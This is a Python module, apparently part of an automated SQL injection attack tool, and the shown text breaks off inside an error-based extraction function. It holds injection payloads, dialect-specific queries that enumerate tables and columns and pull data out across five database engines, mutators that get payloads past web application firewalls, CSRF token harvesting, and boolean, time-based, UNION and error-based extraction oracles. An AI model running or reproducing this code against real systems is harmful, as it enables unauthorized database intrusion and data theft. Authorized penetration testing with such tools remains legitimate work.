import asyncio
import hashlib
import json as _json
import re
import secrets
import time
import html as _html
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.http import fetch, parse_cookie_string, RateLimiter
from core.output import success, warn, info

# ---------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------

ERROR_SIGNATURES = {
    # MySQL
    "you have an error in your sql syntax": "mysql",
    "warning: mysql": "mysql",
    "mysql_fetch_array()": "mysql",
    "mysqli_sql_exception": "mysql",
    "check the manual that corresponds to your mariadb": "mysql",
    # PostgreSQL
    "postgresql query failed": "postgres",
    "pg_query():": "postgres",
    "psycopg2.errors": "postgres",
    "current transaction is aborted": "postgres",
    # MSSQL
    "unclosed quotation mark after the character string": "mssql",
    "microsoft ole db provider for sql server": "mssql",
    "odbc sql server driver": "mssql",
    "quoted string not properly terminated": "mssql",
    "system.data.sqlclient.sqlexception": "mssql",
    "conversion failed when converting": "mssql",
    # SQLite — class-name forms
    "sqlite3.operationalerror": "sqlite",
    "sqlite3.databaseerror": "sqlite",
    "sqlite3.integrityerror": "sqlite",
    "sqlite3.programmingerror": "sqlite",
    "sqlite error": "sqlite",
    # SQLite — message-only forms
    "unrecognized token": "sqlite",
    "no such table": "sqlite",
    "no such column": "sqlite",
    "incomplete input": "sqlite",
    "datatype mismatch": "sqlite",
    'near "': "sqlite",
    "operationalerror": "sqlite",
    "databaseerror": "sqlite",
    # Oracle
    "ora-01756": "oracle",
    "ora-00933": "oracle",
    "ora-00936": "oracle",
    "ora-": "oracle",
    "oracle error": "oracle",
    # Generic ORMs
    "sqlstate[": "generic",
    "sqlalchemy.exc": "generic",
    "sqlalchemy.orm.exc": "generic",
    "psycopg2.programmingerror": "postgres",
    "psycopg2.operationalerror": "postgres",
    "django.db.utils": "generic",
    "django.db.backends": "generic",
    "sequelizedatabaseerror": "generic",
    "sequelize.validationerror": "generic",
    "hibernate.exception": "generic",
    "org.hibernate.exception": "generic",
    "javax.persistence.persistenceexception": "generic",
    "org.springframework.jdbc": "generic",
    "sqlexception:": "generic",
    "activerecord::statementinvalid": "generic",
    "pg::undefinedcolumn": "postgres",
    "pg::syntaxerror": "postgres",
    "pg::programmingerror": "postgres",
    "eloquent\\queryexception": "generic",
    "illuminate\\database": "generic",
    "prismaclientknownrequesterror": "generic",
}


def contains_sql_error(body):
    if not body:
        return None
    # Some apps HTML-escape their error output; unescape so signatures
    # that contain quotes still match.
    lowered = _html.unescape(body).lower()
    for sig in ERROR_SIGNATURES:
        if sig in lowered:
            return sig
    return None


PAYLOADS = ["'", "\"", "')", "';", "' OR '1'='1", "\" OR \"1\"=\"1", "1' AND '1'='2"]

MAX_CONCURRENT_REQUESTS = 10
MAX_EXTRACT_CHARS = 100
ORACLE_REVALIDATE_EVERY = 10
GC_SEP = "\x1f"
TIME_ORACLE_MIN_DELTA = 1.5
TIME_ORACLE_SLEEP = 2
UNION_MAX_COLUMNS = 15
UNION_SENTINEL_A = "zzqA"
UNION_SENTINEL_B = "zzqB"
MAX_EXTRACT_SECONDS = 900
ERROR_WINDOW = 30
PAGE_SIZE = 20
MAX_PAGES = 25

# --- WAF detection ---
# FIX 5: tightened. "access denied" and "forbidden" are far too common on
# legitimate 403 pages and in normal app content.
WAF_SIGNATURES = [
    "mod_security", "modsecurity", "owasp_crs", "owasp crs",
    "not acceptable", "the requested url was rejected",
    "your support id is",
    "cloudflare", "incapsula", "sucuri cloudproxy", "akamai",
    "imperva", "incapsula incident id", "f5 networks",
    "barracuda", "fortiweb", "wallarm", "stackpath",
    "aws waf", "awselb",
    "wordfence", "all in one wp security",
    "request blocked", "malicious request", "attack detected",
    "suspicious activity", "blocked by",
]

# --- CSRF ---
# FIX 5 (partial): dropped bare "nonce" — CSP nonces live in
# <meta name="nonce"> and would be picked up spuriously.
CSRF_PATTERNS = [
    "csrf",
    "_token",
    "authenticity_token",
    "__requestverificationtoken",
    "xsrf",
    "anticsrf",
    "csrfmiddlewaretoken",
    "verification_token",
]

_HIDDEN_INPUT_RE = re.compile(
    r"""<input[^>]*\bname\s*=\s*["']([^"']+)["'][^>]*\bvalue\s*=\s*["']([^"']*)["']""",
    re.IGNORECASE | re.DOTALL,
)
_HIDDEN_INPUT_RE_REV = re.compile(
    r"""<input[^>]*\bvalue\s*=\s*["']([^"']*)["'][^>]*\bname\s*=\s*["']([^"']+)["']""",
    re.IGNORECASE | re.DOTALL,
)
_META_RE = re.compile(
    r"""<meta[^>]*\bname\s*=\s*["']([^"']+)["'][^>]*\bcontent\s*=\s*["']([^"']*)["']""",
    re.IGNORECASE | re.DOTALL,
)

_SQL_KEYWORDS = [
    "select", "union", "and", "or", "from", "where", "order", "by",
    "group", "having", "limit", "offset", "sleep", "waitfor", "delay",
    "extractvalue", "updatexml", "convert", "cast", "concat", "substring",
    "substr", "ascii", "char", "information_schema", "version",
]

_KW_RE = re.compile(
    r"\b(" + "|".join(re.escape(k) for k in _SQL_KEYWORDS) + r")\b",
    re.IGNORECASE,
)


# ---------------------------------------------------------------------
# Dialects
# ---------------------------------------------------------------------

DIALECTS = {
    "mysql": {
        "version": "version()",
        "concat": lambda parts: f"concat({', '.join(parts)})",
        "substring": lambda expr, pos: f"substring(({expr}),{pos},1)",
        "ascii": lambda expr: f"ascii({expr})",
        "group_concat": lambda expr: f"group_concat({expr} SEPARATOR 0x1f)",
        "union_aggregate": lambda e: f"group_concat({e} SEPARATOR 0x1f)",
        "tables_query": ("SELECT group_concat(table_name SEPARATOR 0x1f) "
                         "FROM information_schema.tables WHERE table_schema=database()"),
        "tables_page_query": (
            "SELECT group_concat(table_name SEPARATOR 0x1f) FROM ("
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=database() "
            "LIMIT {limit} OFFSET {offset}) t"),
        "columns_query": lambda t: (
            "SELECT group_concat(column_name SEPARATOR 0x1f) "
            "FROM information_schema.columns "
            f"WHERE table_schema=database() AND table_name='{t}'"),
        "sleep": lambda n: f"sleep({n})",
        "comment": "-- ",
        "ident_quote": "`",
        "str_escape": lambda s: s.replace("'", "''"),
    },
    "postgres": {
        "version": "version()",
        "concat": lambda parts: " || ".join(parts),
        "substring": lambda expr, pos: f"substring(({expr}) from {pos} for 1)",
        "ascii": lambda expr: f"ascii({expr})",
        "group_concat": lambda expr: f"string_agg({expr}, chr(31))",
        "union_aggregate": lambda e: f"string_agg({e}, chr(31))",
        "tables_query": ("SELECT string_agg(table_name, chr(31)) "
                         "FROM information_schema.tables "
                         "WHERE table_schema=current_schema()"),
        "tables_page_query": (
            "SELECT string_agg(table_name, chr(31)) FROM ("
            "SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=current_schema() "
            "LIMIT {limit} OFFSET {offset}) t"),
        "columns_query": lambda t: (
            "SELECT string_agg(column_name, chr(31)) "
            "FROM information_schema.columns "
            f"WHERE table_schema=current_schema() AND table_name='{t}'"),
        "sleep": lambda n: f"pg_sleep({n})",
        "comment": "-- ",
        "ident_quote": '"',
        "str_escape": lambda s: s.replace("'", "''"),
    },
    "mssql": {
        "version": "@@VERSION",
        "concat": lambda parts: " + ".join(parts),
        "substring": lambda expr, pos: f"substring(({expr}),{pos},1)",
        "ascii": lambda expr: f"ascii({expr})",
        "group_concat": lambda expr: f"string_agg({expr}, char(31))",
        "union_aggregate": lambda e: f"string_agg({e}, char(31))",
        "tables_query": "SELECT string_agg(table_name, char(31)) FROM information_schema.tables",
        "tables_page_query": (
            "SELECT string_agg(table_name, char(31)) FROM ("
            "SELECT table_name FROM information_schema.tables "
            "ORDER BY table_name "
            "OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY) t"),
        "columns_query": lambda t: (
            "SELECT string_agg(column_name, char(31)) "
            f"FROM information_schema.columns WHERE table_name='{t}'"),
        "sleep": lambda n: f"WAITFOR DELAY '0:0:{n}'",
        "comment": "-- ",
        "ident_quote": "[",
        "str_escape": lambda s: s.replace("'", "''"),
    },
    "sqlite": {
        "version": "sqlite_version()",
        "concat": lambda parts: " || ".join(parts),
        "substring": lambda expr, pos: f"substr(({expr}),{pos},1)",
        "ascii": lambda expr: f"unicode({expr})",
        "group_concat": lambda expr: f"group_concat({expr}, char(31))",
        "union_aggregate": lambda e: f"group_concat({e}, char(31))",
        "tables_query": "SELECT group_concat(name, char(31)) FROM sqlite_master WHERE type='table'",
        "tables_page_query": (
            "SELECT group_concat(name, char(31)) FROM ("
            "SELECT name FROM sqlite_master WHERE type='table' "
            "LIMIT {limit} OFFSET {offset}) t"),
        "columns_query": lambda t: (
            f"SELECT group_concat(name, char(31)) FROM pragma_table_info('{t}')"),
        # FIX 2 (SQLite time oracle): bumped the multiplier so the recursion
        # actually crosses TIME_ORACLE_MIN_DELTA on most machines.
        "sleep": lambda n: (
            f"(SELECT count(*) FROM (WITH RECURSIVE c(x) AS "
            f"(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<{n*2000000}) "
            f"SELECT x FROM c))"
        ),
        "comment": "-- ",
        "ident_quote": '"',
        "str_escape": lambda s: s.replace("'", "''"),
    },
    "oracle": {
        "version": "(SELECT banner FROM v$version WHERE rownum=1)",
        "concat": lambda parts: " || ".join(parts),
        "substring": lambda expr, pos: f"substr(({expr}),{pos},1)",
        "ascii": lambda expr: f"ascii({expr})",
        "group_concat": lambda expr: f"listagg({expr}, chr(31))",
        # FIX 3: Oracle LISTAGG cannot take a scalar subquery. XMLAGG does.
        "union_aggregate": lambda e: (
            f"RTRIM(XMLAGG(XMLELEMENT(e,({e}),chr(31)).EXTRACT('//text()')),"
            f"chr(31))"
        ),
        "tables_query": "SELECT listagg(table_name, chr(31)) FROM all_tables",
        "tables_page_query": (
            "SELECT listagg(table_name, chr(31)) FROM ("
            "SELECT table_name FROM all_tables "
            "ORDER BY table_name "
            "OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY) t"),
        "columns_query": lambda t: (
            "SELECT listagg(column_name, chr(31)) FROM all_tab_columns "
            f"WHERE table_name='{t.upper()}'"),
        "sleep": lambda n: f"dbms_pipe.receive_message(('a'),{n})",
        "comment": "-- ",
        "ident_quote": '"',
        "str_escape": lambda s: s.replace("'", "''"),
    },
}

DEFAULT_DIALECT = "mysql"


def _dialect(dbms):
    return DIALECTS.get(dbms or DEFAULT_DIALECT, DIALECTS[DEFAULT_DIALECT])


def _ident(name, d):
    q = d["ident_quote"]
    return f"[{name}]" if q == "[" else f"{q}{name}{q}"


# ---------------------------------------------------------------------
# Injection contexts
# ---------------------------------------------------------------------

# FIX 1: the old contexts appended AND '1'='1 after the injected
# condition, which left dangling quotes on string-context endpoints.
# `--` terminates the rest of the query.
def _ctx_single_quote(cond): return f"' AND ({cond})--"
def _ctx_double_quote(cond): return f"\" AND ({cond})--"
def _ctx_numeric(cond):      return f" AND ({cond})--"
def _ctx_paren_single(cond): return f"') AND ({cond})--"
def _ctx_paren_double(cond): return f"\") AND ({cond})--"

CONTEXTS = [
    ("single_quote", _ctx_single_quote),
    ("double_quote", _ctx_double_quote),
    ("numeric",      _ctx_numeric),
    ("paren_single", _ctx_paren_single),
    ("paren_double", _ctx_paren_double),
]

UNION_PREFIXES = {
    "single_quote":  "' UNION SELECT ",
    "double_quote":  "\" UNION SELECT ",
    "numeric":       " UNION SELECT ",
    "paren_single":  "') UNION SELECT ",
    "paren_double":  "\") UNION SELECT ",
}


# ---------------------------------------------------------------------
# WAF evasion mutators
# ---------------------------------------------------------------------

def m_identity(p):
    return p


# FIX 6: expand the URL-encoding set. The old set missed (), comma, *, |,
# =, +, etc., which are all commonly filtered by WAFs.
_UNRESERVED = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~")


def m_url_encode(p):
    return "".join(
        ch if ch in _UNRESERVED else urllib.parse.quote(ch, safe="")
        for ch in p
    )


def m_double_url(p):
    return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")


def m_case_keywords(p):
    def alt(m):
        word = m.group(0)
        return "".join(c.upper() if i % 2 == 0 else c.lower()
                       for i, c in enumerate(word))
    return _KW_RE.sub(alt, p)


def m_comment_keywords(p):
    def split(m):
        w = m.group(0)
        if len(w) < 3:
            return w
        mid = len(w) // 2
        return w[:mid] + "/**/" + w[mid:]
    return _KW_RE.sub(split, p)


def m_space_to_comment(p):
    return re.sub(r"(?<=[\w'\"])\s+(?=[\w'\"])", "/**/", p)


def m_space_to_tab(p):
    return p.replace(" ", "\t")


def m_quote_to_char(p):
    return p.replace("'", "CHAR(39)")


def m_or_to_pipes(p):
    return re.sub(r"\bOR\b", "||", p, flags=re.IGNORECASE)


def m_and_to_amp(p):
    return re.sub(r"\bAND\b", "&&", p, flags=re.IGNORECASE)


# FIX 6: mutators are now dialect-scoped. || is string concat on
# PostgreSQL/Oracle, && is MySQL-only. Applying blindly breaks payloads.
_MUTATORS_COMMON = [
    ("identity",         m_identity),
    ("url_encode",       m_url_encode),
    ("case_keywords",    m_case_keywords),
    ("comment_keywords", m_comment_keywords),
    ("space_to_comment", m_space_to_comment),
    ("space_to_tab",     m_space_to_tab),
    ("double_url",       m_double_url),
]

_MUTATORS_MYSQL = _MUTATORS_COMMON + [
    ("or_to_pipes",   m_or_to_pipes),
    ("and_to_amp",    m_and_to_amp),
    ("quote_to_char", m_quote_to_char),
]

_MUTATORS_BY_DIALECT = {
    "mysql":    _MUTATORS_MYSQL,
    "mssql":    _MUTATORS_COMMON,
    "postgres": _MUTATORS_COMMON,
    "sqlite":   _MUTATORS_COMMON,
    "oracle":   _MUTATORS_COMMON,
}


def _mutators_for(dbms):
    return _MUTATORS_BY_DIALECT.get(dbms, _MUTATORS_COMMON)


# ---------------------------------------------------------------------
# CSRF token jar
# ---------------------------------------------------------------------

class TokenJar:
    def __init__(self):
        self.tokens = {}

    def update(self, found):
        if found:
            self.tokens.update({k.lower(): v for k, v in found.items()})

    def get(self, name):
        return self.tokens.get((name or "").lower())

    def __bool__(self):
        return bool(self.tokens)


def _looks_like_csrf(name):
    low = (name or "").lower()
    return any(p in low for p in CSRF_PATTERNS)


def find_tokens(body, headers=None):
    found = {}
    if body:
        for m in _HIDDEN_INPUT_RE.finditer(body):
            name, value = m.group(1), m.group(2)
            if _looks_like_csrf(name):
                found[name] = value
        for m in _HIDDEN_INPUT_RE_REV.finditer(body):
            value, name = m.group(1), m.group(2)
            if _looks_like_csrf(name):
                found[name] = value
        for m in _META_RE.finditer(body):
            name, value = m.group(1), m.group(2)
            if _looks_like_csrf(name):
                found[name] = value
    if headers:
        for hname, hval in headers.items():
            if _looks_like_csrf(hname):
                found[hname] = hval
    return found


async def refresh_tokens(session, point, jar, limiter, verbose=False):
    token_point = InjectionPoint(
        point.kind, point.name, point.url, point.method,
        dict(point.headers), point.body, point.content_type,
        dict(point.cookies) if point.cookies else None,
    )
    r = await _send_raw(session, token_point, limiter)
    if r is None:
        return False
    _, headers, body, _ = r
    found = find_tokens(body, headers)
    if found:
        jar.update(found)
        if verbose:
            info(f"csrf: cached {len(found)} token(s): "
                 f"{', '.join(found.keys())}")
        return True
    return False


def _apply_tokens(point, jar):
    if not jar:
        return point
    clone = InjectionPoint(
        point.kind, point.name, point.url, point.method,
        dict(point.headers), point.body, point.content_type,
        dict(point.cookies) if point.cookies else None,
    )
    if clone.body:
        ct = (clone.content_type or "").lower()
        if "json" in ct:
            try:
                obj = _json.loads(clone.body)
                if isinstance(obj, dict):
                    changed = False
                    for k in list(obj.keys()):
                        tok = jar.get(k)
                        if tok is not None:
                            obj[k] = tok
                            changed = True
                    if changed:
                        clone.body = _json.dumps(obj)
            except Exception:
                pass
        else:
            qp = parse_qs(clone.body, keep_blank_values=True)
            changed = False
            for k in list(qp.keys()):
                tok = jar.get(k)
                if tok is not None:
                    qp[k] = [tok]
                    changed = True
            if changed:
                clone.body = urlencode(qp, doseq=True)
    for hname in list(clone.headers.keys()):
        tok = jar.get(hname)
        if tok is not None:
            clone.headers[hname] = tok
    for name, value in jar.tokens.items():
        if any(name == h.lower() for h in clone.headers):
            continue
        if "-" in name:
            clone.headers[name] = value
    return clone


# ---------------------------------------------------------------------
# Injection points
# ---------------------------------------------------------------------

class InjectionPoint:
    def __init__(self, kind, name, url, method="GET", headers=None,
                 body=None, content_type=None, cookies=None, dbms=None):
        self.kind = kind
        self.name = name
        self.url = url
        self.method = method.upper()
        self.headers = dict(headers or {})
        self.body = body
        self.content_type = content_type
        self.cookies = cookies
        # Fix: dbms travels with the point so mutators don't need plumbing.
        self.dbms = dbms

    def with_payload(self, payload):
        c = InjectionPoint(self.kind, self.name, self.url, self.method,
                           self.headers, self.body, self.content_type,
                           self.cookies, self.dbms)
        if self.kind == "query":
            c.url = _inject_into_query(self.url, self.name, payload)
        elif self.kind == "body":
            c.body = _inject_into_body(self.body or "", self.name, payload,
                                       self.content_type)
        elif self.kind == "header":
            c.headers[self.name] = payload
        elif self.kind == "cookie":
            c.cookies = dict(self.cookies or {})
            c.cookies[self.name] = payload
        return c


def _inject_into_query(url, name, payload):
    p = urlparse(url)
    qp = parse_qs(p.query, keep_blank_values=True)
    if name in qp and len(qp[name]) > 1:
        warn(f"param {name!r} has {len(qp[name])} values; using first")
    qp[name] = [str(qp[name][0]) + payload] if name in qp else [payload]
    return urlunparse((p.scheme, p.netloc, p.path, p.params,
                       urlencode(qp, doseq=True), p.fragment))


# FIX 2 (JSON injection): always send the injected value as a string.
# Preserving int/float type silently produced confusing findings.
def _inject_into_body(body, name, payload, content_type):
    ct = (content_type or "").lower()
    if "json" in ct:
        try:
            obj = _json.loads(body) if body else {}
        except Exception:
            obj = {}
        if isinstance(obj, dict) and name in obj:
            obj[name] = f"{obj[name]}{payload}"
        elif isinstance(obj, dict):
            obj[name] = payload
        return _json.dumps(obj)
    qp = parse_qs(body, keep_blank_values=True)
    qp[name] = [str(qp[name][0]) + payload] if name in qp else [payload]
    return urlencode(qp, doseq=True)


# ---------------------------------------------------------------------
# Adaptive limiter
# ---------------------------------------------------------------------

class AdaptiveLimiter:
    def __init__(self, base: RateLimiter):
        self.base = base
        self.backoff = 1.0
        self.clean_streak = 0

    async def wait(self):
        # FIX 7: backoff is an absolute extra delay, not scaled by base.rate.
        if self.backoff > 1.0:
            await asyncio.sleep(self.backoff - 1.0)
        await self.base.wait()

    def observe(self, status):
        if status in (429, 503):
            self.backoff = min(self.backoff * 2.0, 64.0)
            self.clean_streak = 0
        elif status is not None and status < 500:
            # FIX 7: treat 4xx that aren't rate-limit codes as clean.
            self.clean_streak += 1
            if self.clean_streak >= 20:
                self.backoff = 1.0
                self.clean_streak = 0


# ---------------------------------------------------------------------
# HTTP
# ---------------------------------------------------------------------

async def _send_raw(session, point, limiter):
    start = time.perf_counter()
    try:
        status, headers, body, _ = await fetch(
            session, point.url, limiter.base,
            method=point.method, cookies=point.cookies,
            headers=point.headers,
            data=point.body if point.method != "GET" else None,
        )
    except Exception as e:
        warn(f"transport error on {point.url}: {type(e).__name__}: {e!r}")
        return None
    elapsed = time.perf_counter() - start
    if body is None:
        return None
    limiter.observe(status)
    return status, headers, body, elapsed


# FIX 1 (blocked heuristic): the old 100-byte / 4x-baseline checks
# misclassified short legitimate responses as WAF blocks.
def _looks_blocked(status, body, baseline_len=None):
    if status in (403, 406, 419, 429, 501, 502, 503):
        return True
    if body is None:
        return True
    low = body.lower()
    for sig in WAF_SIGNATURES:
        if sig in low:
            return True
    if baseline_len and baseline_len >= 500:
        if len(body) < 100:
            return True
        if len(body) > 4 * baseline_len:
            return True
    return False


async def _send(session, point, limiter, jar=None, raw_payload=None,
                evade=False, baseline_len=None, verbose=False, dbms=None):
    """Send a request.

    dbms: dialect hint, forwarded to the mutator table in evasive mode.
          Falls back to the point's own dbms if provided there.
    """
    if raw_payload is None:
        if jar:
            point = _apply_tokens(point, jar)
        r = await _send_raw(session, point, limiter)
        if r is None:
            return None
        return r + ("identity",)

    if not evade:
        p = point.with_payload(raw_payload)
        if jar:
            p = _apply_tokens(p, jar)
        r = await _send_raw(session, p, limiter)
        if r is None:
            return None
        return r + ("identity",)

    # Evasive path
    effective_dbms = dbms or point.dbms
    for name, mutate in _mutators_for(effective_dbms):
        mutated = mutate(raw_payload)
        p = point.with_payload(mutated)
        if jar:
            p = _apply_tokens(p, jar)
        r = await _send_raw(session, p, limiter)
        if r is None:
            continue
        status, headers, body, elapsed = r
        if not _looks_blocked(status, body, baseline_len):
            if name != "identity" and verbose:
                info(f"waf bypass: {name!r} worked for {point.name!r}")
            return r + (name,)
        if verbose:
            info(f"waf: mutation {name!r} blocked")
    warn(f"waf: all mutations blocked for {point.name!r}")
    return None


# FIX 9: SHA-1 for fingerprinting. MD5 works but gets flagged by linters.
def _hash(body):
    return hashlib.sha1(body.encode("utf-8", errors="ignore")).hexdigest()


# ---------------------------------------------------------------------
# Context detection
# ---------------------------------------------------------------------

async def detect_context(session, point, limiter, dbms, jar=None, verbose=False,
                         evade=False, baseline_len=None):
    d = _dialect(dbms)
    for name, wrap in CONTEXTS:
        t = await _send(session, point, limiter, jar,
                        raw_payload=wrap("1=1"), evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        f = await _send(session, point, limiter, jar,
                        raw_payload=wrap("1=2"), evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        if t is None or f is None:
            continue

        if verbose:
            m = re.search(r"<pre>(.*?)</pre>", t[2], re.DOTALL)
            err = m.group(1) if m else "(no <pre>)"
            info(f"DEBUG pre-block for {name!r}: {err[:200]!r}")

        # Reject contexts whose payloads trigger SQL errors: the body
        # difference is then just error text, not a data oracle.
        if contains_sql_error(t[2]) or contains_sql_error(f[2]):
            if verbose:
                info(f"context {name!r}: payload triggers SQL error, "
                     f"not a usable data oracle")
            continue

        t2 = await _send(session, point, limiter, jar,
                         raw_payload=wrap("1=1"), evade=evade,
                         baseline_len=baseline_len, verbose=verbose,
                         dbms=dbms)
        if t2 is not None and _hash(t[2]) != _hash(t2[2]):
            if verbose:
                warn(f"context {name!r}: page is dynamic, oracle unstable")
            continue

        if _hash(t[2]) != _hash(f[2]):
            if verbose:
                info(f"context {name!r} usable via hash oracle")
            return name, wrap, "hash", {"true_hash": _hash(t[2])}

        if d["sleep"] is None:
            continue
        # FIX 4: use the raw baseline (raw_payload=None), not "".
        base = await _send(session, point, limiter, jar,
                           raw_payload=None, evade=False,
                           baseline_len=baseline_len, verbose=verbose)
        if base is None:
            continue
        sleep_expr = d["sleep"](TIME_ORACLE_SLEEP)
        t_time = await _send(session, point, limiter, jar,
                             raw_payload=wrap(f"({sleep_expr})"), evade=evade,
                             baseline_len=baseline_len, verbose=verbose,
                             dbms=dbms)
        if t_time is None:
            continue
        if (t_time[3] - base[3]) >= TIME_ORACLE_MIN_DELTA:
            if verbose:
                info(f"context {name!r} usable via time oracle")
            return name, wrap, "time", {"baseline": base[3]}

    if verbose:
        warn(f"no usable injection context for {point.kind}:{point.name!r} "
             f"(oracle opaque: page may ignore the parameter, or a WAF is "
             f"stripping payloads, or the dialect has no sleep fallback)")
    return None, None, None, None


# ---------------------------------------------------------------------
# Reflection suppression
# ---------------------------------------------------------------------

# FIX 8: compare each probe against the *baseline* hash too. Also gate
# on SQL errors, which otherwise false-positive as "reflection" when
# both probes trigger different error text.
async def detect_reflection(session, point, limiter, jar=None, verbose=False,
                            evade=False, baseline_len=None, baseline_hash=None):
    a = await _send(session, point, limiter, jar,
                    raw_payload="zzA" + secrets.token_hex(6), evade=evade,
                    baseline_len=baseline_len, verbose=verbose)
    b = await _send(session, point, limiter, jar,
                    raw_payload="zzB" + secrets.token_hex(6), evade=evade,
                    baseline_len=baseline_len, verbose=verbose)
    if a is None or b is None:
        return False

    # If both probes are SQL errors, the diff is just error text.
    if contains_sql_error(a[2]) and contains_sql_error(b[2]):
        return False

    ha, hb = _hash(a[2]), _hash(b[2])
    reflected = ha != hb
    if reflected and baseline_hash is not None:
        # If one probe matches the baseline, the other one being different
        # is more likely a dynamic element than reflection.
        if ha == baseline_hash or hb == baseline_hash:
            reflected = False
    if reflected and verbose:
        warn(f"parameter {point.name!r} reflects payloads; extraction may be poisoned")
    return reflected


# ---------------------------------------------------------------------
# Union
# ---------------------------------------------------------------------

# FIX 3 (partial): start at 1 column, not 2.
async def detect_union(session, point, ctx_name, limiter, dbms,
                       baseline_body, jar=None, max_columns=UNION_MAX_COLUMNS,
                       verbose=False, evade=False, baseline_len=None):
    d = _dialect(dbms)
    prefix = UNION_PREFIXES.get(ctx_name)
    if prefix is None:
        return None, None
    comment = d["comment"]

    for n in range(1, max_columns + 1):
        for idx in range(n):
            marker = f"{UNION_SENTINEL_A}{n}x{idx}{UNION_SENTINEL_B}"
            if marker in baseline_body:
                continue
            cols = [str(i + 1) for i in range(n)]
            cols[idx] = f"'{marker}'"
            payload = f"{prefix}{','.join(cols)}{comment}"
            r = await _send(session, point, limiter, jar,
                            raw_payload=payload, evade=evade,
                            baseline_len=baseline_len, verbose=verbose,
                            dbms=dbms)
            if r is None:
                continue
            if marker in r[2] and marker not in baseline_body:
                if verbose:
                    info(f"union: {n} columns, position {idx} printable")
                return n, idx
    return None, None


# FIX 3: use union_aggregate from the dialect instead of group_concat.
async def union_extract(session, point, ctx_name, limiter, n_cols,
                        printable_idx, sql_query, dbms, jar=None,
                        label="data", verbose=False, evade=False,
                        baseline_len=None):
    d = _dialect(dbms)
    prefix = UNION_PREFIXES.get(ctx_name)
    if prefix is None:
        return ""
    comment = d["comment"]

    agg = d.get("union_aggregate") or d["group_concat"]
    inner = agg(f"({sql_query})")
    marker_a = f"zzqA{secrets.token_hex(4)}"
    marker_b = f"zzqB{secrets.token_hex(4)}"
    bracketed = d["concat"]([f"'{marker_a}'", inner, f"'{marker_b}'"])

    cols = [str(i + 1) for i in range(n_cols)]
    cols[printable_idx] = bracketed
    payload = f"{prefix}{','.join(cols)}{comment}"
    r = await _send(session, point, limiter, jar,
                    raw_payload=payload, evade=evade,
                    baseline_len=baseline_len, verbose=verbose,
                    dbms=dbms)
    if r is None:
        return ""
    body = r[2]

    if body.count(marker_a) != 1 or body.count(marker_b) != 1:
        if verbose:
            warn(f"{label}: sentinel ambiguity "
                 f"(a={body.count(marker_a)} b={body.count(marker_b)})")
        return ""

    start = body.find(marker_a) + len(marker_a)
    end = body.find(marker_b, start)
    if end < 0:
        return ""
    value = body[start:end]
    if verbose and value:
        info(f"  {label} (union): {value[:60]!r}")
    return value


# ---------------------------------------------------------------------
# Error-based extraction — MySQL, MSSQL, Oracle
# ---------------------------------------------------------------------

MYSQL_ERROR_FUNCS = {
    "extractvalue": {
        "payload": "AND extractvalue(1,concat(0x7e,({expr})))",
        "windowed": True,
        "marker": "~",
    },
    "updatexml": {
        "payload": "AND updatexml(1,concat(0x7e,({expr})),1)",
        "windowed": True,
        "marker": "~",
    },
    "gtid_subset": {
        "payload": "AND GTID_SUBSET(({expr}),1)",
        "windowed": False,
        "marker": "'",
    },
}

MSSQL_ERROR_FUNCS = {
    "convert_int": {
        "payload_template": "AND 1=convert(int, ({wrapped_expr}))",
        "windowed": True,
        "truncate_len": 180,
    },
    "cast_int": {
        "payload_template": "AND 1=cast(({wrapped_expr}) AS int)",
        "windowed": True,
        "truncate_len": 180,
    },
}

ORACLE_ERROR_FUNCS = {
    "utl_inaddr": {
        "payload_template": "AND 1=utl_inaddr.get_host_address({wrapped_expr})",
        "windowed": True,
        "truncate_len": 400,
    },
    "ctxsys_drithsx": {
        "payload_template": "AND 1=ctxsys.drithsx.sn({wrapped_expr})",
        "windowed": True,
        "truncate_len": 400,
    },
    "dbms_xmlgen": {
        "payload_template": "AND 1=dbms_xmlgen.newcontext({wrapped_expr})",
        "windowed": True,
        "truncate_len": 400,
    },
    "xmltype": {
        "payload_template": "AND 1=xmltype({wrapped_expr})",
        "windowed": True,
        "truncate_len": 400,
    },
}


def _wrap_sentinel_oracle(expr, a, b):
    return f"'{a}'||({expr})||'{b}'"


def _wrap_sentinel_mssql(expr, a, b):
    return f"'{a}' + ({expr}) + '{b}'"


def _parse_between_sentinels(body, a, b):
    if not body or a not in body or b not in body:
        return ""
    start = body.find(a)
    if start < 0:
        return ""
    start += len(a)
    end = body.find(b, start)
    if end < 0:
        return ""
    return body[start:end]


def _parse_error_value_mysql(body, marker):
    if not body or marker not in body:
        return ""
    idx = body.find(marker)
    while idx >= 0:
        start = idx + len(marker)
        end_sq = body.find("'", start)
        end_dq = body.find('"', start)
        candidates = [e for e in (end_sq, end_dq) if e >= 0]
        if candidates:
            end = min(candidates)
            value = body[start:end]
            if value and "\n" not in value:
                return value
        idx = body.find(marker, idx + 1)
    return ""


def _error_funcs_for(dbms):
    if dbms == "mysql":
        return MYSQL_ERROR_FUNCS
    if dbms == "mssql":
        return MSSQL_ERROR_FUNCS
    if dbms == "oracle":
        return ORACLE_ERROR_FUNCS
    return {}


async def detect_error_oracle(session, point, wrap, limiter, dbms,
                              jar=None, verbose=False, evade=False,
                              baseline_len=None):
    funcs = _error_funcs_for(dbms)
    if not funcs:
        return None

    if dbms == "mysql":
        for name, spec in funcs.items():
            payload = wrap(spec["payload"].format(expr="version()"))
            r = await _send(session, point, limiter, jar,
                            raw_payload=payload, evade=evade,
                            baseline_len=baseline_len, verbose=verbose,
                            dbms=dbms)
            if r is None:
                continue
            leaked = _parse_error_value_mysql(r[2], spec["marker"])
            # FIX 5 (partial): accept any non-empty leak.
            if leaked:
                if verbose:
                    info(f"error oracle usable: {name} (leaked {leaked[:40]!r})")
                return name
        return None

    a = "zzqA" + secrets.token_hex(3)
    b = "zzqB" + secrets.token_hex(3)
    for name, spec in funcs.items():
        if dbms == "mssql":
            wrapped = _wrap_sentinel_mssql("'mssql-mark'", a, b)
        else:
